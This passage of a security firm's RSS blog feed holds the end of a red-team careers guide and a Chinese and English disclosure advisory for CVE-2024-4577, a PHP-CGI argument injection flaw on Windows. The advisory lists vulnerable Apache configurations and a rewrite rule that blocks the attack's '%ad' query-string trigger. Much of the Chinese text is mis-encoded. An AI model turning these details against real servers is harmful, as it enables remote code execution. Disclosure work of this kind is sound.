  &lt;li&gt;&lt;strong&gt;é»‘ç®±ç·´ç¿’&lt;/strong&gt;ï¼šåƒèˆ‡ bug bounty è¨ˆç•«ï¼ŒæŒ‘æˆ°çœŸå¯¦ä¸–ç•Œçš„å®‰å…¨å•é¡Œã€‚å°ç£ä¼æ¥­çš„è¨ˆç•«å¯ä»¥åƒè€ƒ &lt;a href=&quot;https://zeroday.hitcon.org/bug-bounty/list&quot;&gt;HITCON ZeroDay&lt;/a&gt; ï¼Œåœ‹å¤–å‰‡æ¨è–¦ &lt;a href=&quot;https://hackerone.com/opportunities/all&quot;&gt;HackerOne&lt;/a&gt; ä¸Šé¢çš„ç›®æ¨™ã€‚é€™äº›è¨ˆç•«æœƒè®“ä½ é¢å°æ›´è¤‡é›œå’Œå¤šæ¨£çš„æ”»æ“Šå ´æ™¯ï¼Œæå‡ä½ çš„å¯¦æˆ°èƒ½åŠ›ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-æ‰¾åŒä¼´ä¸€èµ·&quot;&gt;ğŸ“Œ æ‰¾åŒä¼´ä¸€èµ·&lt;/h3&gt;

&lt;p&gt;åœ¨è³‡å®‰é€™æ¢è·¯ä¸Šï¼Œæ‰¾åˆ°å¿—åŒé“åˆçš„å¤¥ä¼´ä¸€èµ·å­¸ç¿’ã€ä¸€èµ·æ‰“ CTFã€ä¸€èµ·æŒ–æ¼æ´çµ•å°æ¯”ç¨è‡ªå‡ç´šä¾†çš„æœ‰æ•ˆç‡ï¼Œä¸‹åˆ—æ´»å‹•å¯è€ƒæ…®åƒåŠ ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2024/CMT/&quot;&gt;HITCON Community&lt;/a&gt;: å¹¾ä¹æ‰€æœ‰è³‡å®‰ç¤¾ç¾¤éƒ½æœƒèšé›†åœ¨é€™å€‹ç ”è¨æœƒï¼Œå¯ä»¥åœ¨ç ”è¨æœƒä¸­æ‰¾ä¸€å€‹é©åˆè‡ªå·±çš„ç¤¾ç¾¤åƒèˆ‡ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ais3.org/&quot;&gt;AIS3&lt;/a&gt;: èšé›†å°ç£å¹¾ä¹æ‰€æœ‰å°è³‡å®‰æœ‰èˆˆè¶£çš„åœ¨å­¸ç”Ÿã€‚æ»¿æœ‰æ©Ÿæœƒåœ¨é€™é‚Šèªè­˜å¿—åŒé“åˆçš„æœ‹å‹ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://forms.gle/3HHuBVzjHCwfAnGc8&quot;&gt;å°ç£å¥½å²é§­ Deep Hacking è®€æ›¸æœƒ&lt;/a&gt;: å…¨å°ç£æ¢è¨è³‡å®‰æœ€æ·±æœ€æ‰å¯¦çš„è®€æ›¸æœƒä¹‹ä¸€ï¼ŒåƒåŠ çµ•å°å¯ä»¥ææ˜‡è¦–é‡ã€ä¹Ÿèƒ½èªè­˜å„ç¨®é«˜æ‰‹ã€‚å…§å®¹å Binary ä½†ç›®å‰æ¼¸æ¼¸åœ¨è½‰å‹ä¸­ï¼Œå¸Œæœ›ä¸åˆ†é¡ä»¥æŒ–æ˜æ¼æ´ç‚ºä¸»ã€‚&lt;/li&gt;
  &lt;li&gt;DEVCORE å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼š æ¯å¹´ä¸€æœˆä¸­å’Œä¸ƒæœˆä¸­æœƒæ‹›ç”Ÿï¼Œå¦‚æœç›®çš„æ˜¯æ‡‰å¾µ DEVCOREï¼ŒåƒåŠ è¨ˆç•«å•å°å¸«æ‡‰è©²æ˜¯æœ€å¿«çš„ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦‚æœä½ æƒ³çŸ¥é“æ›´å¤šè³‡æºï¼Œ&lt;a href=&quot;https://github.com/Ice1187/TW-Security-and-CTF-Resource&quot;&gt;å°ç£è³‡å®‰ / CTF å­¸ç¿’è³‡æºæ•´ç†&lt;/a&gt; æ•´ç†çš„è³‡æºå€¼å¾—åƒè€ƒã€‚&lt;/p&gt;

&lt;h2 id=&quot;-å°çµ&quot;&gt;ğŸš€ å°çµ&lt;/h2&gt;

&lt;p&gt;æœ¬ç¯‡æŒ‡å—åˆ†æˆå…©éƒ¨åˆ†ï¼šå‰åŠéƒ¨ä¸»è¦åœ¨çµ¦æ‡‰å¾µè€…ä¸€äº›å°æé†’ï¼Œå¸Œæœ›æ‡‰å¾µè€…èƒ½æŠŠæœ€å¥½çš„ä¸€é¢å‘ˆç¾å‡ºä¾†ã€‚å¾ŒåŠéƒ¨æä¾›ä¸€å€‹å­¸ç¿’çš„è„ˆçµ¡ï¼Œå¸Œæœ›çµ¦é‚„åœ¨å­¸ç¿’éšæ®µçš„äººä¸€å€‹æ¯”è¼ƒæ¸…æ¥šçš„æ–¹å‘ã€‚&lt;/p&gt;

&lt;p&gt;æœ€çµ‚ï¼Œæˆ‘å€‘éƒ½å¸Œæœ›å°ç£æœ‰è¶Šä¾†è¶Šå¤šç†±æ„›æŠ€è¡“çš„äººé€²å…¥è³‡å®‰ç”¢æ¥­ã€‚å¸Œæœ›ï¼Œæœªä¾†èƒ½æŒçºŒåœ¨è³‡å®‰é ˜åŸŸçœ‹è¦‹æ­£åœ¨é–±è®€çš„ä½ ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/</link>
                <guid>https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist</guid>
                <pubDate>Tue, 09 Jul 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è³‡å®‰é€šå ±ï¼šPHP é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œ (CVE-2024-4577) - PHP CGI åƒæ•¸æ³¨å…¥å¼±é»</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ´å¤«å¯‡çˆ¾ç ”ç©¶åœ˜éšŠåœ¨é€²è¡Œ&lt;a href=&quot;https://devco.re/research/overview/&quot;&gt;å‰ç»æ”»æ“Šç ”ç©¶&lt;/a&gt;æœŸé–“ï¼Œç™¼ç¾ PHP ç¨‹å¼èªè¨€å­˜åœ¨é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œå¼±é»ï¼ŒåŸºæ–¼ PHP åœ¨ç¶²ç«™ç”Ÿæ…‹ä½¿ç”¨çš„å»£æ³›æ€§ä»¥åŠæ­¤å¼±é»ä¹‹æ˜“é‡ç¾æ€§ï¼Œç ”ç©¶åœ˜éšŠå°‡æ­¤å¼±é»æ¨™è¨˜ç‚ºåš´é‡ã€ä¸¦åœ¨ç¬¬ä¸€æ™‚é–“å›å ±çµ¦ PHP å®˜æ–¹ã€‚å®˜æ–¹å·²åœ¨ 2024/06/06 ç™¼ä½ˆä¿®å¾©ç‰ˆæœ¬ï¼Œè©³ç´°æ™‚ç¨‹å¯åƒé–±&lt;a href=&quot;#æ¼æ´å›å ±æ™‚é–“è»¸&quot;&gt;æ¼æ´å›å ±æ™‚é–“è»¸&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´æè¿°&quot;&gt;æ¼æ´æè¿°&lt;/h2&gt;

&lt;p&gt;PHP ç¨‹å¼èªè¨€åœ¨è¨­è¨ˆæ™‚å¿½ç•¥ Windows ä½œæ¥­ç³»çµ±å…§éƒ¨å°å­—å…ƒç·¨ç¢¼è½‰æ›çš„ &lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;Best-Fit&lt;/a&gt; ç‰¹æ€§ï¼Œå°è‡´æœªèªè­‰çš„æ”»æ“Šè€…å¯é€éç‰¹å®šçš„å­—å…ƒåºåˆ—ç¹éèˆŠæœ‰ &lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CVE-2012-1823&lt;/a&gt; çš„ä¿è­·ï¼›é€éåƒæ•¸æ³¨å…¥ç­‰æ”»æ“Šåœ¨é ç«¯ PHP ä¼ºæœå™¨ä¸ŠåŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å½±éŸ¿ç¯„åœ&quot;&gt;å½±éŸ¿ç¯„åœ&lt;/h2&gt;

&lt;p&gt;æ­¤å¼±é»&lt;strong&gt;å½±éŸ¿å®‰è£æ–¼ Windows ä½œæ¥­ç³»çµ±ä¸Šæ‰€æœ‰çš„ PHP ç‰ˆæœ¬&lt;/strong&gt;ï¼Œè©³æƒ…å¯åƒç…§ä¸‹è¡¨:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/li&gt;
  &lt;li&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/li&gt;
  &lt;li&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼ PHP 8.0 åˆ†æ”¯ã€PHP 7 ä»¥åŠ PHP 5 å®˜æ–¹å·²&lt;a href=&quot;https://www.php.net/eol.php&quot;&gt;ä¸å†ç¶­è­·&lt;/a&gt;ï¼Œç¶²ç«™ç®¡ç†å“¡å¯åƒè€ƒ&lt;a href=&quot;#å¦‚ä½•ç¢ºèªè‡ªå·±æ˜“é­å—æ”»æ“Š&quot;&gt;å¦‚ä½•ç¢ºèªè‡ªå·±æ˜“é­å—æ”»æ“Š&lt;/a&gt;ç« ç¯€ï¼Œä¸¦æ–¼&lt;a href=&quot;#ä¿®è£œå»ºè­°&quot;&gt;ä¿®è£œå»ºè­°&lt;/a&gt;æ‰¾åˆ°æš«æ™‚ç·©è§£æªæ–½ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•ç¢ºèªè‡ªå·±æ˜“é­å—æ”»æ“Š&quot;&gt;å¦‚ä½•ç¢ºèªè‡ªå·±æ˜“é­å—æ”»æ“Š?&lt;/h2&gt;

&lt;p&gt;å°æ–¼å¸¸è¦‹ä¹‹ Apache HTTP Server åŠ ä¸Š PHP çµ„åˆï¼Œç¶²ç«™ç®¡ç†å“¡å¯é€éæ­¤æ–‡ç« åˆ—å‡ºä¹‹å…©å€‹æ–¹å¼ç¢ºèªä¼ºæœå™¨æ˜¯å¦æ˜“è¢«æ”»æ“Šã€‚å…¶ä¸­ï¼Œæƒ…å¢ƒäºŒä¹Ÿæ˜¯ &lt;a href=&quot;https://www.apachefriends.org/&quot;&gt;XAMPP for Windows&lt;/a&gt; å®‰è£æ™‚çš„é è¨­è¨­å®šï¼Œå› æ­¤&lt;strong&gt;æ‰€æœ‰ç‰ˆæœ¬çš„ XAMPP for Windows å®‰è£ä¹Ÿé è¨­å—æ­¤å¼±é»å½±éŸ¿ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;åœ¨æœ¬æ–‡æ’°å¯«ç•¶ä¸‹å·²é©—è­‰ç•¶ Windows ä½œæ¥­ç³»çµ±åŸ·è¡Œæ–¼ä¸‹åˆ—èªç³»æ™‚ï¼Œ&lt;strong&gt;æœªæˆæ¬Šçš„æ”»æ“Šè€…å¯ç›´æ¥åœ¨é ç«¯ä¼ºæœå™¨ä¸ŠåŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ç¹é«”ä¸­æ–‡ (å­—ç¢¼é  950)&lt;/li&gt;
  &lt;li&gt;ç°¡é«”ä¸­æ–‡ (å­—ç¢¼é  936)&lt;/li&gt;
  &lt;li&gt;æ—¥æ–‡ (å­—ç¢¼é  932)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°æ–¼å…¶å®ƒåŸ·è¡Œåœ¨è‹±æ–‡ã€éŸ“æ–‡ã€è¥¿æ­èªç³»ä¹‹ Windows ä½œæ¥­ç³»çµ±ï¼Œç”±æ–¼ PHP ä½¿ç”¨æƒ…å¢ƒå»£æ³›ã€æš«ç„¡æ³•å®Œå…¨åˆ—èˆ‰ä¸¦æ’é™¤å…¶åˆ©ç”¨æƒ…å¢ƒï¼Œå› æ­¤é‚„æ˜¯å»ºè­°ä½¿ç”¨è€…å…¨é¢ç›¤é»è³‡ç”¢ã€ç¢ºèªä½¿ç”¨æƒ…å¢ƒä¸¦æ›´æ–° PHP è‡³æœ€æ–°ç‰ˆæœ¬ç¢ºä¿è¬ç„¡ä¸€å¤±ï¼&lt;/p&gt;

&lt;h3 id=&quot;æƒ…å¢ƒä¸€-å°‡-php-è¨­å®šæ–¼-cgi-æ¨¡å¼ä¸‹åŸ·è¡Œ&quot;&gt;æƒ…å¢ƒä¸€: å°‡ PHP è¨­å®šæ–¼ CGI æ¨¡å¼ä¸‹åŸ·è¡Œ&lt;/h3&gt;

&lt;p&gt;åœ¨ Apache Httpd è¨­å®šæª”ä¸­é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Action&lt;/code&gt; èªæ³•å°‡å°æ‡‰çš„ HTTP è«‹æ±‚äº¤çµ¦ PHP-CGI åŸ·è¡Œæª”è™•ç†æ™‚ï¼Œå—æ­¤å¼±é»å½±éŸ¿ï¼Œå¸¸è¦‹è¨­å®šåŒ…å«ä½†ä¸é™æ–¼:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; cgi-script .php
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ–&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;\.php$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; application/x-httpd-php-cgi
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;æƒ…å¢ƒäºŒ-å°‡-php-åŸ·è¡Œæª”æš´éœ²åœ¨å¤–-xampp-é è¨­å®‰è£è¨­å®š&quot;&gt;æƒ…å¢ƒäºŒ: å°‡ PHP åŸ·è¡Œæª”æš´éœ²åœ¨å¤– (XAMPP é è¨­å®‰è£è¨­å®š)&lt;/h3&gt;

&lt;p&gt;å³ä½¿æœªè¨­å®š PHP æ–¼ CGI æ¨¡å¼ä¸‹åŸ·è¡Œï¼Œåƒ…å°‡ PHP åŸ·è¡Œæª”æš´éœ²åœ¨ CGI ç›®éŒ„ä¸‹ä¹Ÿå—æ­¤å¼±é»å½±éŸ¿ï¼Œå¸¸è¦‹æƒ…æ³åŒ…å«ä½†ä¸é™æ–¼:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php.exe&lt;/code&gt; æˆ– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt; è¤‡è£½åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; ç›®éŒ„ä¸­&lt;/li&gt;
  &lt;li&gt;å°‡ PHP å®‰è£ç›®éŒ„é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; æš´éœ²åˆ°å¤–ï¼Œå¦‚:
    &lt;pre&gt;&lt;code class=&quot;language-apache2=&quot;&gt; ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ä¿®è£œå»ºè­°&quot;&gt;ä¿®è£œå»ºè­°&lt;/h2&gt;

&lt;p&gt;å¼·çƒˆå»ºè­°æ‰€æœ‰ä½¿ç”¨è€…å‡ç´šè‡³ PHP å®˜æ–¹æœ€æ–°ç‰ˆæœ¬ &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;ã€&lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;ï¼Œå°æ–¼ç„¡æ³•å‡ç´šçš„ç³»çµ±å¯é€éä¸‹åˆ—æ–¹å¼æš«æ™‚ç·©è§£å¼±é»ã€‚&lt;/p&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œç”±æ–¼ PHP CGI å·²æ˜¯ä¸€ç¨®éæ™‚ä¸”æ˜“æ–¼å‡ºç¾å•é¡Œçš„æ¶æ§‹ï¼Œä¹Ÿå»ºè­°è©•ä¼°é·ç§»è‡³è¼ƒç‚ºå®‰å…¨çš„ Mod-PHPã€FastCGI æˆ–æ˜¯ PHP-FPM ç­‰æ¶æ§‹å¯èƒ½æ€§ã€‚&lt;/p&gt;

&lt;h3 id=&quot;1-å°ç„¡æ³•æ›´æ–°-php-çš„ä½¿ç”¨è€…&quot;&gt;1. å°ç„¡æ³•æ›´æ–° PHP çš„ä½¿ç”¨è€…&lt;/h3&gt;

&lt;p&gt;å¯é€éä¸‹åˆ— Rewrite è¦å‰‡é˜»æ“‹æ”»æ“Šï¼Œè«‹æ³¨æ„&lt;strong&gt;æ­¤ä»½è¦å‰‡åªä½œç‚ºç¹é«”ä¸­æ–‡ã€ç°¡é«”ä¸­æ–‡åŠæ—¥æ–‡èªç³»ä¸­çš„æš«æ™‚æ€§ç·©è§£æ©Ÿåˆ¶&lt;/strong&gt;ï¼Œå¯¦å‹™ä¸Šä»å»ºè­°æ›´æ–°åˆ°å·²ä¿®å¾©ç‰ˆæœ¬æˆ–æ›´æ”¹æ¶æ§‹ã€‚&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{QUERY_STRING} ^%ad [NC]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; .? - [F,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-å°-xampp-for-windows-ä½¿ç”¨è€…&quot;&gt;2. å° XAMPP for Windows ä½¿ç”¨è€…&lt;/h3&gt;

&lt;p&gt;åœ¨æ’°å¯«æœ¬æ–‡çš„ç•¶ä¸‹ï¼ŒXAMPP å°šæœªé‡å°æ­¤æ¼æ´é‡‹å‡ºç›¸å°æ‡‰çš„æ›´æ–°å®‰è£æª”ï¼Œå¦‚ç¢ºèªè‡ªèº«çš„ XAMPP ä¸¦ç„¡ä½¿ç”¨åˆ° PHP CGI ä¹‹åŠŸèƒ½ï¼Œå¯é€éä¿®æ”¹ä¸‹åˆ— Apache Httpd è¨­å®šæª”ä»¥é¿å…æš´éœ²åœ¨å¼±é»ä¸­:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:/xampp/apache/conf/extra/httpd-xampp.conf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ‰¾åˆ°ç›¸å°æ‡‰çš„è¨­å®šè¡Œæ•¸:&lt;/p&gt;
&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸¦å°‡å…¶è¨»è§£:&lt;/p&gt;
&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;æ¼æ´å›å ±æ™‚é–“è»¸&quot;&gt;æ¼æ´å›å ±æ™‚é–“è»¸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2024/05/07 - DEVCORE é€é PHP å®˜æ–¹å¼±é»é€šå ±é é¢å›å ±æ­¤å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;2024/05/07 - PHP é–‹ç™¼è€…ç¢ºèªå¼±é»ä¸¦å¼·èª¿è¦ç›¡å¿«ä¿®å¾©ã€‚&lt;/li&gt;
  &lt;li&gt;2024/05/16 - PHP é–‹ç™¼è€…é‡‹å‡ºç¬¬ä¸€ç‰ˆä¿®å¾©ä¸¦å°‹æ±‚å»ºè­°ã€‚&lt;/li&gt;
  &lt;li&gt;2024/05/18 - PHP é–‹ç™¼è€…é‡‹å‡ºç¬¬äºŒç‰ˆä¿®å¾©ä¸¦å°‹æ±‚å»ºè­°ã€‚&lt;/li&gt;
  &lt;li&gt;2024/05/20 - PHP é€²å…¥æ–°ç‰ˆæœ¬ç™¼å¸ƒæº–å‚™ã€‚&lt;/li&gt;
  &lt;li&gt;2024/06/06 - PHP ç™¼å¸ƒæ–°ç‰ˆæœ¬ &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;ã€&lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;åƒè€ƒè³‡æ–™&quot;&gt;åƒè€ƒè³‡æ–™&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;PHP Security Advisory - PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI&lt;/a&gt; (to be announced)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;MS-UCODEREF - Windows Protocols Unicode Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CERT/CC VU#520827 - PHP-CGI query string parameter vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/</link>
                <guid>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability</guid>
                <pubDate>Thu, 06 Jun 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Security Alert: CVE-2024-4577 - PHP CGI Argument Injection Vulnerability</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;During DEVCOREâ€™s &lt;a href=&quot;https://devco.re/en/research/overview/&quot;&gt;continuous offensive research&lt;/a&gt;, our team discovered a remote code execution vulnerability in PHP. Due to the widespread use of the programming language in the web ecosystem and the ease of exploitability, DEVCORE classified its severity as critical, and promptly reported it to the PHP official team. The official team released a patch on 2024/06/06. Please refer to the &lt;a href=&quot;#Timeline&quot;&gt;timeline&lt;/a&gt; for disclosure details.&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;While implementing PHP, the team did not notice the &lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;Best-Fit&lt;/a&gt; feature of encoding conversion within the Windows operating system. This oversight allows unauthenticated attackers to bypass the previous protection of &lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CVE-2012-1823&lt;/a&gt; by specific character sequences. Arbitrary code can be executed on remote PHP servers through the argument injection attack.&lt;/p&gt;

&lt;h2 id=&quot;impact&quot;&gt;Impact&lt;/h2&gt;

&lt;p&gt;This vulnerability &lt;strong&gt;affects all versions of PHP installed on the Windows operating system&lt;/strong&gt;. Please refer to the table below for details:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/li&gt;
  &lt;li&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/li&gt;
  &lt;li&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since the branch of PHP 8.0, PHP 7, and PHP 5 are &lt;a href=&quot;https://www.php.net/eol.php&quot;&gt;End-of-Life&lt;/a&gt;, and are no longer maintained anymore, server admins can refer to the &lt;a href=&quot;#am-i-vulnerable&quot;&gt;Am I Vulnerable&lt;/a&gt; section to find temporary patch recommendations in the &lt;a href=&quot;#mitigation-measure&quot;&gt;Mitigation Measure&lt;/a&gt; section.&lt;/p&gt;

&lt;h2 id=&quot;am-i-vulnerable&quot;&gt;Am I Vulnerable?&lt;/h2&gt;

&lt;p&gt;For the usual case of combinations like Apache HTTP Server and PHP, server administrators can use the two methods listed in this article to determine whether their servers are vulnerable or not. Itâ€™s notable to address that Scenario-2 is also the default configuration for &lt;a href=&quot;https://www.apachefriends.org/&quot;&gt;XAMPP for Windows&lt;/a&gt;, so &lt;strong&gt;all versions of XAMPP installations on Windows are vulnerable by default&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;As of this writing, it has been verified that when the Windows is running in the following locales, &lt;strong&gt;an unauthorized attacker can directly execute arbitrary code on the remote server&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Traditional Chinese (Code Page 950)&lt;/li&gt;
  &lt;li&gt;Simplified Chinese (Code Page 936)&lt;/li&gt;
  &lt;li&gt;Japanese (Code Page 932)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For Windows running in other locales such as English, Korean, and Western European, due to the wide range of PHP usage scenarios, it is currently not possible to completely enumerate and eliminate all potential exploitation scenarios. Therefore, it is recommended that users conduct a comprehensive asset assessment, verify their usage scenarios, and update PHP to the latest version to ensure security.&lt;/p&gt;

&lt;h3 id=&quot;scenario-1-running-php-under-cgi-mode&quot;&gt;&lt;strong&gt;Scenario 1&lt;/strong&gt;: Running PHP under CGI mode&lt;/h3&gt;

&lt;p&gt;When configuring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Action&lt;/code&gt; directive to map corresponding HTTP requests to a PHP-CGI executable binary in Apache HTTP Server, this vulnerability can be exploited directly. Common configurations affected include, but are not limited to:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; cgi-script .php
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Or&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;\.php$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; application/x-httpd-php-cgi
